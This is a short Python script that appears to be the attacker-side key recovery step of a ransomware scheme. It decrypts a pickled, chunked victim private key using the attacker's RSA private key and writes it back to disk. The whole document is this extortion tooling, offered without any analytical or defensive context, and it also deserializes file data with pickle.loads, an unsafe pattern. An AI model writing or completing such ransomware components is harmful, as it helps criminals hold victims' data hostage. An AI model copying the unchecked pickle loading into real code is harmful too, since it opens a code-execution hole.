import pickle
import rsa

def read_file(file_path):
    with open(file_path, 'rb') as f:
        return f.read()
    
def write_file(data, file_path):
    with open(file_path, 'wb') as f:
        f.write(data)

def decrypt_RSA(data:bytes, private_key):
    return rsa.decrypt(data, private_key)

encrypted = read_file('victim_private_key_encrypted')
encrypted = pickle.loads(encrypted)

attacker_private_key = rsa.PrivateKey.load_pkcs1(read_file('attacker_private_key.pem'))

victim_private_key = b''
for i in encrypted:
    victim_private_key += decrypt_RSA(i, attacker_private_key)

write_file(victim_private_key, 'victim_private_key.pem')